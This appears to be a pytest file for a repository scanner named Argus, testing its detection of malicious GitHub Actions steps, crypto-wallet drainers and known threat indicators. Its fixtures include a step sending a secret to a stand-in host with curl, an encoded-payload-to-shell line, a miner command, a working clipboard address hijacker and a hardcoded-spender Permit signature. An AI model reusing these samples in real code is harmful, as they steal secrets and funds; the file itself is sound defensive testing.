"""#179 injected workflows, #180 crypto drainers, #181 known IOCs.

Samples are written for these tests. Suspicious literals are assembled with J(...) so this
file doesn't trip Argus's own scan of the repo.
"""

from __future__ import annotations

import io
import zipfile
from pathlib import Path

import pytest

from argus.models import Severity
from argus.tools import threat_intel as ti
from argus.tools.malware import _drainer_findings, _workflow_findings, run_malware_scan


def J(*parts: str) -> str:
    return "".join(parts)


async def _ids(tmp_path: Path, files: dict[str, str]) -> dict[str, Severity]:
    for name, text in files.items():
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
    result = await run_malware_scan(str(tmp_path))
    return {f.rule_id: f.severity for f in result.findings}


# ── #179 GitHub Actions ────────────────────────────────────────────────────────

WF = ".github/workflows/ci.yml"


def _workflow(step: str, on: str = "push", runs_on: str = "ubuntu-latest") -> str:
    return (
        f"name: ci\non: {on}\njobs:\n  build:\n    runs-on: {runs_on}\n    steps:\n"
        f"      - uses: actions/checkout@v4\n      - run: {step}\n"
    )


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("step", "rule"),
    [
        (J('echo "${{ to', 'JSON(secrets) }}" | base64'), "malware-gha-secrets-dump"),
        (J("echo ${{ secrets.NPM_TOKEN }} | ba", "se64"), "malware-gha-secret-exfil"),
        (
            J("echo ${{ secrets.DEPLOY_KEY }} | cu", "rl -d @- https://x.example"),
            "malware-gha-secret-exfil",
        ),
        (
            J("echo aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29y | base64 -d | ", "sh"),
            "malware-gha-encoded-exec",
        ),
        (J("./xm", "rig -o stra", "tum+tcp://pool.example:3333"), "malware-gha-crypto-miner"),
    ],
)
async def test_injected_workflow_steps_are_high(tmp_path: Path, step: str, rule: str) -> None:
    found = await _ids(tmp_path, {WF: _workflow(step)})
    assert found.get(rule) == Severity.HIGH


@pytest.mark.asyncio
async def test_installer_pipe_is_a_low_confidence_review(tmp_path: Path) -> None:
    (tmp_path / ".github" / "workflows").mkdir(parents=True)
    (tmp_path / WF).write_text(_workflow(J("cu", "rl -LsSf https://astral.sh/uv/install.sh | sh")))
    result = await run_malware_scan(str(tmp_path))
    hits = [f for f in result.findings if f.rule_id == "malware-gha-download-exec"]
    assert [(f.severity, f.confidence) for f in hits] == [(Severity.MEDIUM, "low")]


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "step",
    [
        "npm ci && npm test",
        'curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/user',
        'echo "::add-mask::${{ secrets.TOKEN }}"',
        J("cu", "rl -fsSL https://get.docker.com -o get-docker.sh"),
    ],
)
async def test_ordinary_workflow_steps_are_quiet(tmp_path: Path, step: str) -> None:
    found = await _ids(tmp_path, {WF: _workflow(step)})
    assert not {k for k in found if k.startswith("malware-gha")}


def test_self_hosted_runner_on_pull_requests_is_flagged() -> None:
    text = _workflow("make", on="[push, pull_request]", runs_on="[self-hosted, linux]")
    (finding,) = _workflow_findings(text, WF)
    assert finding.rule_id == "malware-gha-self-hosted-pr"
    assert text.splitlines()[finding.line - 1].strip().startswith("runs-on")
    block = "name: x\non:\n  pull_request_target:\n    branches: [main]\njobs:\n  a:\n    runs-on: self-hosted\n"
    assert [f.rule_id for f in _workflow_findings(block, WF)] == ["malware-gha-self-hosted-pr"]


@pytest.mark.parametrize(
    "text",
    [
        _workflow("make", on="push", runs_on="self-hosted"),  # no PR trigger
        _workflow("make", on="pull_request", runs_on="ubuntu-latest"),  # GitHub-hosted
    ],
)
def test_self_hosted_without_pr_trigger_or_hosted_with_pr_is_quiet(text: str) -> None:
    assert _workflow_findings(text, WF) == []


# ── #180 crypto drainers ───────────────────────────────────────────────────────

ADDR = J("'0x", "5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAed'")

CLIPPER = f"""
const attacker = {ADDR};
document.addEventListener('copy', (e) => {{
  const text = window.getSelection().toString();
  if (/0x[a-fA-F0-9]{{40}}/.test(text)) {{
    e.clipboardData.setData('text/plain', attacker);
    e.preventDefault();
  }}
}});
"""

PERMIT = f"""
const sig = await signer.signTypedData(domain, {{ Permit: PERMIT_TYPES }}, {{
  owner, spender: {ADDR}, value: MAX, nonce, deadline,
}});
"""


def test_clipboard_hijacker_is_high() -> None:
    (finding,) = _drainer_findings(CLIPPER, "src/index.js")
    assert (finding.rule_id, finding.severity) == (
        "malware-clipboard-address-hijack",
        Severity.HIGH,
    )


def test_permit_with_hardcoded_spender_is_high() -> None:
    (finding,) = _drainer_findings(PERMIT, "src/claim.js")
    assert finding.rule_id == "malware-permit-phishing"
    assert "0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAed" in finding.title


@pytest.mark.parametrize(
    "code",
    [
        # copy button in a wallet UI: writes only, never intercepts
        "const isAddr = /^0x[a-fA-F0-9]{40}$/; button.onclick = () => navigator.clipboard.writeText(address);",
        # paste validation: reads the paste but never writes the clipboard
        "input.addEventListener('paste', (e) => { ok = /0x[a-fA-F0-9]{40}/.test(e.clipboardData.getData('text')); });",
        # permit with the spender from config, not a literal
        "await signer.signTypedData(domain, { Permit: T }, { owner, spender: ROUTER_ADDRESS, value });",
    ],
)
def test_ordinary_wallet_code_is_quiet(code: str) -> None:
    assert _drainer_findings(code, "src/wallet.js") == []


@pytest.mark.asyncio
async def test_unlimited_approval_to_a_literal_is_a_review(tmp_path: Path) -> None:
    code = f"await token.approve({ADDR}, ethers.MaxUint256);\nawait nft.setApprovalForAll({ADDR}, true);\n"
    result = await run_malware_scan_files(tmp_path, {"src/drain.js": code})
    hits = {f.rule_id: (f.severity, f.confidence) for f in result.findings}
    assert hits["malware-unlimited-approval-literal"] == (Severity.MEDIUM, "low")
    assert hits["malware-set-approval-for-all-literal"] == (Severity.MEDIUM, "low")


@pytest.mark.asyncio
async def test_exact_approval_is_quiet(tmp_path: Path) -> None:
    result = await run_malware_scan_files(
        tmp_path, {"src/pay.js": "await token.approve(router, amount);\n"}
    )
    assert not [f for f in result.findings if "approval" in f.rule_id]


async def run_malware_scan_files(tmp_path: Path, files: dict[str, str]):  # type: ignore[no-untyped-def]
    for name, text in files.items():
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
    return await run_malware_scan(str(tmp_path))


# ── #181 known IOCs ────────────────────────────────────────────────────────────

EVIL_DOMAIN = J("payload-cdn", ".example-bad.net")
EVIL_URL = J("http://203.0.113.9", "/bins/loader.sh")
EVIL_IP = "198.51.100.23"

THREATFOX_CSV = (
    "################################################################\n"
    "# ThreatFox IOCs: full data dump (CSV)                         #\n"
    "################################################################\n"
    '# "first_seen_utc","ioc_id","ioc_value","ioc_type","threat_type","fk_malware",'
    '"malware_alias","malware_printable","last_seen_utc","confidence_level","reference","tags",'
    '"anonymous","reporter"\n'
    f'"2026-10-01 10:00:00", "1", "{EVIL_DOMAIN}", "domain", "payload_delivery", "x", "", '
    '"ChainDrop", "", "100", "", "", "0", "someone"\n'
    f'"2026-10-02 10:00:00", "2", "{EVIL_IP}:443", "ip:port", "botnet_cc", "x", "", '
    '"Lumma Stealer", "", "75", "", "", "0", "someone"\n'
)
URLHAUS_CSV = (
    "# id,dateadded,url,url_status,last_online,threat,tags,urlhaus_link,reporter\n"
    f'"1","2026-11-01 00:00:00","{EVIL_URL}","online","","malware_download","sh","x","r"\n'
    '"2","2026-11-01 00:00:00","https://github.com/someone/repo/raw/main/evil.exe","online","",'
    '"malware_download","exe","x","r"\n'
)


def test_classify_values() -> None:
    assert ti.classify("HTTP://Evil.Example/Path/")
    assert ti.classify("HTTP://Evil.Example/Path/").value == "http://evil.example/Path"  # type: ignore[union-attr]
    assert ti.classify(f"{EVIL_IP}:8080").kind == "ip"  # type: ignore[union-attr]
    assert ti.classify("a" * 64).kind == "sha256"  # type: ignore[union-attr]
    assert ti.classify("not an ioc") is None


def test_parse_feeds_by_column_name() -> None:
    fox = ti.parse_feed(THREATFOX_CSV, "ThreatFox")
    assert {(i.kind, i.value, i.family) for i in fox} == {
        ("domain", EVIL_DOMAIN, "ChainDrop"),
        ("ip", EVIL_IP, "Lumma Stealer"),
    }
    haus = ti.parse_feed(URLHAUS_CSV, "URLhaus")
    assert {i.value for i in haus} == {
        ti._normalise_url(EVIL_URL),
        "https://github.com/someone/repo/raw/main/evil.exe",
    }
    # no header: first cell that looks like an IOC
    assert ti.parse_feed(f"x,{EVIL_DOMAIN},y\n", "custom")[0].value == EVIL_DOMAIN


def _seed_cache(name: str, data: bytes) -> None:
    cache = ti._cache_dir()
    cache.mkdir(parents=True, exist_ok=True)
    (cache / f"{name.lower()}.bin").write_bytes(data)


def _zip(text: str) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as archive:
        archive.writestr("full.csv", text)
    return buf.getvalue()


@pytest.mark.asyncio
async def test_cached_feeds_match_urls_domains_subdomains_and_ips(tmp_path: Path) -> None:
    _seed_cache("ThreatFox", _zip(THREATFOX_CSV))  # zipped, like full.csv.zip
    _seed_cache("URLhaus", URLHAUS_CSV.encode())
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "loader.js").write_text(
        f"const a = 'https://cdn.{EVIL_DOMAIN}/x.js';\n"  # subdomain of a listed domain
        f"const b = '{EVIL_URL}';\n"
        f"const c = '{EVIL_IP}';\n"
        "const ok = 'https://github.com/someone/other/raw/main/tool.exe';\n"
    )
    result = await ti.run_threat_scan(str(tmp_path))
    found = {(f.rule_id, f.line) for f in result.findings}
    assert found == {("threat-ioc-domain", 1), ("threat-ioc-url", 2), ("threat-ioc-ip", 3)}
    assert all(f.severity == Severity.CRITICAL for f in result.findings)
    assert "ChainDrop" in next(f.title for f in result.findings if f.line == 1)
    assert set(result.metadata["sources"]) == {"ThreatFox", "URLhaus"}


@pytest.mark.asyncio
async def test_platform_domains_only_match_exact_urls(tmp_path: Path) -> None:
    _seed_cache("URLhaus", URLHAUS_CSV.encode())
    (tmp_path / "a.md").write_text(
        "see https://github.com/someone/repo/raw/main/evil.exe\nand https://github.com/torvalds/linux\n"
    )
    result = await ti.run_threat_scan(str(tmp_path))
    assert [(f.rule_id, f.line) for f in result.findings] == [("threat-ioc-url", 1)]


@pytest.mark.asyncio
async def test_local_ioc_list_and_file_hashes(tmp_path: Path) -> None:
    payload = b"\x7fELF\x00\x00fake-binary-for-test"
    import hashlib

    (tmp_path / ".argus").mkdir()
    (tmp_path / ".argus" / "iocs.txt").write_text(
        f"# incident 42\n{hashlib.sha256(payload).hexdigest()}\n{EVIL_DOMAIN}  # C2\n"
    )
    (tmp_path / "tools").mkdir()
    (tmp_path / "tools" / "helper.bin").write_bytes(payload)
    (tmp_path / "app.py").write_text(f"URL = 'https://{EVIL_DOMAIN}/beacon'\n")
    result = await ti.run_threat_scan(str(tmp_path))
    assert {(f.rule_id, f.file) for f in result.findings} == {
        ("threat-ioc-sha256", "tools/helper.bin"),
        ("threat-ioc-domain", "app.py"),
    }
    assert result.metadata["sources"] == ["local IOC list (iocs.txt)"]


@pytest.mark.asyncio
async def test_without_key_feeds_are_skipped_with_a_note(tmp_path: Path) -> None:
    (tmp_path / "a.py").write_text("x = 1\n")
    result = await ti.run_threat_scan(str(tmp_path))
    assert result.findings == []
    assert any("ARGUS_ABUSECH_AUTH_KEY" in n for n in result.metadata["notes"])


def test_key_downloads_once_and_caches(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("ARGUS_NO_NETWORK", raising=False)
    monkeypatch.setenv("ARGUS_ABUSECH_AUTH_KEY", "test-key")
    calls: list[str] = []

    def fake_download(url: str) -> bytes:
        calls.append(url)
        return URLHAUS_CSV.encode() if "urlhaus" in url else b"# empty\n"

    monkeypatch.setattr(ti, "_download", fake_download)
    notes: list[str] = []
    first = ti.load_feeds(notes)
    second = ti.load_feeds(notes)
    assert len(calls) == 3  # one per feed, second run served from the cache
    assert all("/test-key/" in url for url in calls)
    assert {i.value for i in first} == {i.value for i in second}
    assert notes == []


def test_no_network_uses_cache_only(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("ARGUS_ABUSECH_AUTH_KEY", "test-key")  # ARGUS_NO_NETWORK=1 from conftest

    def must_not_download(url: str) -> bytes:
        raise AssertionError("no downloads with --no-network")

    monkeypatch.setattr(ti, "_download", must_not_download)
    _seed_cache("URLhaus", URLHAUS_CSV.encode())
    assert {i.source for i in ti.load_feeds([])} == {"URLhaus"}


@pytest.mark.asyncio
async def test_malware_scan_includes_ioc_matches(tmp_path: Path) -> None:
    (tmp_path / ".argus").mkdir()
    (tmp_path / ".argus" / "iocs.txt").write_text(EVIL_DOMAIN + "\n")
    (tmp_path / "x.js").write_text(f"fetch('https://{EVIL_DOMAIN}/c2')\n")
    result = await run_malware_scan(str(tmp_path))
    assert "threat-ioc-domain" in {f.rule_id for f in result.findings}
    assert result.metadata["threat_intel"]["iocs_loaded"] == 1


@pytest.mark.asyncio
async def test_malformed_urls_do_not_crash_the_scan(tmp_path: Path) -> None:
    (tmp_path / ".argus").mkdir()
    (tmp_path / ".argus" / "iocs.txt").write_text(EVIL_DOMAIN + "\n")
    (tmp_path / "cors.ts").write_text(
        "origin: 'http://localhost:3000,http://localhost:5173'\n"
        f"const c2 = 'https://{EVIL_DOMAIN}/x';\n"
    )
    result = await ti.run_threat_scan(str(tmp_path))
    assert [(f.rule_id, f.line) for f in result.findings] == [("threat-ioc-domain", 2)]
